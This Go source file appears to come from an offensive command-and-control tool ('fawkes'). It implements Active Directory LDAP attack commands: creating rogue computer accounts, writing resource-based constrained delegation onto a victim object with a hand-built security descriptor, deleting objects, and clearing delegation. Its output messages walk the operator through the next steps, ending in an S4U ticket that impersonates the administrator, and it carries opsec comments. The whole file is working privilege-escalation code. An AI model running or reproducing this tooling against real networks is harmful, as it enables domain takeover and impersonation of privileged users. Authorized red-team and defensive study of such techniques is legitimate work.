package commands

import (
	"encoding/binary"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target (computer name, without trailing $) is required")
	}

	if args.Value == "" && args.UseTLS {
		return errorResult("Error: -value (password for the computer account) is required when using LDAPS")
	}

	// Normalize: ensure sAMAccountName ends with $
	samName := args.Target
	if !strings.HasSuffix(samName, "$") {
		samName = samName + "$"
	}

	// Computer DN goes in the default Computers container
	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", args.Target, baseDN)

	// Encode password as UTF-16LE with surrounding quotes (AD unicodePwd format)
	quotedPwd := "\"" + args.Value + "\""
	utf16Pwd := make([]byte, len(quotedPwd)*2)
	for i, c := range quotedPwd {
		utf16Pwd[i*2] = byte(c)
		utf16Pwd[i*2+1] = 0
	}
	defer structs.ZeroBytes(utf16Pwd) // opsec: zero UTF-16 password buffer

	addReq := ldap.NewAddRequest(computerDN, nil)
	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
	addReq.Attribute("cn", []string{args.Target})
	addReq.Attribute("sAMAccountName", []string{samName})

	if args.UseTLS {
		// Over LDAPS: set password directly, use WORKSTATION_TRUST_ACCOUNT (0x1000)
		addReq.Attribute("userAccountControl", []string{"4096"})
		addReq.Attribute("unicodePwd", []string{string(utf16Pwd)})
	} else {
		// Over LDAP: can't set unicodePwd, use WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD (0x1020 = 4128)
		addReq.Attribute("userAccountControl", []string{"4128"})
	}

	// Set DNS hostname if we can infer the domain
	dnsParts := strings.Split(baseDN, ",")
	var domainParts []string
	for _, part := range dnsParts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToUpper(part), "DC=") {
			domainParts = append(domainParts, part[3:])
		}
	}
	if len(domainParts) > 0 {
		fqdn := strings.ToLower(args.Target) + "." + strings.Join(domainParts, ".")
		addReq.Attribute("dNSHostName", []string{fqdn})
	}

	if err := conn.Add(addReq); err != nil {
		return errorf("Error creating computer account: %v", err)
	}

	pwdStatus := "(set)"
	uacStr := "WORKSTATION_TRUST_ACCOUNT (0x1000)"
	extraNote := ""
	if !args.UseTLS {
		pwdStatus = "(not set — use set-password over LDAPS to set)"
		uacStr = "WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD (0x1020)"
		extraNote = "\n[!] Password not set (requires LDAPS). For RBCD, this is fine — S4U uses the machine account hash.\n"
	}

	return successf("[*] LDAP Computer Account Creation (T1136.002)\n"+
		"[+] DN:            %s\n"+
		"[+] sAMAccountName: %s\n"+
		"[+] Password:      %s\n"+
		"[+] UAC:           %s\n"+
		"[+] Server:        %s\n"+
		"%s"+
		"\n[!] Next: ldap-write -action set-rbcd -target <victim> -value %s\n"+
		"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
		computerDN, samName, pwdStatus, uacStr, args.Server, extraNote, samName)
}

func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target (object to delete — sAMAccountName, CN, or full DN) is required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	delReq := ldap.NewDelRequest(targetDN, nil)
	if err := conn.Del(delReq); err != nil {
		return errorf("Error deleting object: %v", err)
	}

	return successf("[*] LDAP Object Deletion\n"+
		"[+] Deleted: %s\n"+
		"[+] Server:  %s\n", targetDN, args.Server)
}

func ldapSetRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Value == "" {
		return errorResult("Error: -target (victim service account/computer) and -value (delegated account sAMAccountName, e.g. FAKEPC01$) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	// Resolve the delegated account and get its objectSid
	delegatedDN, err := ldapResolveDN(conn, args.Value, baseDN)
	if err != nil {
		return errorf("Error resolving delegated account '%s': %v", args.Value, err)
	}

	// Fetch the objectSid of the delegated account
	searchReq := ldap.NewSearchRequest(
		delegatedDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"objectSid"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return errorf("Error fetching objectSid for '%s': %v", args.Value, err)
	}

	sid := result.Entries[0].GetRawAttributeValue("objectSid")
	if len(sid) < 8 {
		return errorf("Error: invalid objectSid for '%s' (length %d)", args.Value, len(sid))
	}

	// Build self-relative security descriptor with DACL granting GENERIC_ALL to the SID
	sd := buildRBCDSecurityDescriptor(sid)
	sidStr := adcsParseSID(sid)

	// Set msDS-AllowedToActOnBehalfOfOtherIdentity
	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error setting RBCD delegation: %v", err)
	}

	return successf("[*] LDAP RBCD Configuration (T1134.001)\n"+
		"[+] Target:    %s\n"+
		"[+] Delegated: %s (%s)\n"+
		"[+] SID:       %s\n"+
		"[+] Server:    %s\n"+
		"\n[!] %s can now impersonate users to services on %s\n"+
		"[!] Next: ticket -action s4u ...\n",
		targetDN, delegatedDN, args.Value, sidStr, args.Server, args.Value, args.Target)
}

func ldapClearRBCD(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target (object to clear RBCD from) is required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	// Clear msDS-AllowedToActOnBehalfOfOtherIdentity by replacing with empty value
	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error clearing RBCD delegation: %v", err)
	}

	return successf("[*] LDAP RBCD Cleared\n"+
		"[+] Target: %s\n"+
		"[+] Cleared: msDS-AllowedToActOnBehalfOfOtherIdentity\n"+
		"[+] Server: %s\n", targetDN, args.Server)
}

// buildRBCDSecurityDescriptor creates a self-relative security descriptor
// with a DACL containing one ACCESS_ALLOWED_ACE granting full control to the given SID.
// Matches Impacket's rbcd.py format: OwnerSid=BUILTIN\Administrators, AclRevision=4.
func buildRBCDSecurityDescriptor(sid []byte) []byte {
	// Owner SID: S-1-5-32-544 (BUILTIN\Administrators)
	ownerSid := []byte{
		0x01, 0x02, // Revision=1, SubAuthorityCount=2
		0x00, 0x00, 0x00, 0x00, 0x00, 0x05, // IdentifierAuthority = NT Authority (5)
		0x20, 0x00, 0x00, 0x00, // SubAuthority[0] = 32 (BUILTIN)
		0x20, 0x02, 0x00, 0x00, // SubAuthority[1] = 544 (Administrators)
	}
	ownerLen := len(ownerSid) // 16 bytes

	sidLen := len(sid)
	aceSize := 8 + sidLen             // ACE header (4) + mask (4) + SID
	aclSize := 8 + aceSize            // ACL header (8) + ACE
	sdSize := 20 + ownerLen + aclSize // SD header (20) + OwnerSid + DACL

	sd := make([]byte, sdSize)

	// Security descriptor header (self-relative)
	sd[0] = 1                                       // Revision
	sd[1] = 0                                       // Sbz1
	binary.LittleEndian.PutUint16(sd[2:4], 0x8004)  // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
	binary.LittleEndian.PutUint32(sd[4:8], 20)      // OffsetOwner (right after header)
	binary.LittleEndian.PutUint32(sd[8:12], 0)      // OffsetGroup (none)
	binary.LittleEndian.PutUint32(sd[12:16], 0)     // OffsetSacl (none)
	daclOff := 20 + ownerLen
	binary.LittleEndian.PutUint32(sd[16:20], uint32(daclOff)) // OffsetDacl

	// Owner SID
	copy(sd[20:], ownerSid)

	// ACL header (ACL_REVISION_DS = 4 for directory service ACLs)
	sd[daclOff] = 4   // AclRevision (ACL_REVISION_DS)
	sd[daclOff+1] = 0 // Sbz1
	binary.LittleEndian.PutUint16(sd[daclOff+2:daclOff+4], uint16(aclSize))
	binary.LittleEndian.PutUint16(sd[daclOff+4:daclOff+6], 1) // AceCount
	binary.LittleEndian.PutUint16(sd[daclOff+6:daclOff+8], 0) // Sbz2

	// ACCESS_ALLOWED_ACE
	aceOff := daclOff + 8
	sd[aceOff] = 0x00   // AceType: ACCESS_ALLOWED_ACE_TYPE
	sd[aceOff+1] = 0x00 // AceFlags
	binary.LittleEndian.PutUint16(sd[aceOff+2:aceOff+4], uint16(aceSize))
	binary.LittleEndian.PutUint32(sd[aceOff+4:aceOff+8], 0x000F003F) // Full control mask (983551)

	// SID
	copy(sd[aceOff+8:], sid)

	return sd
}
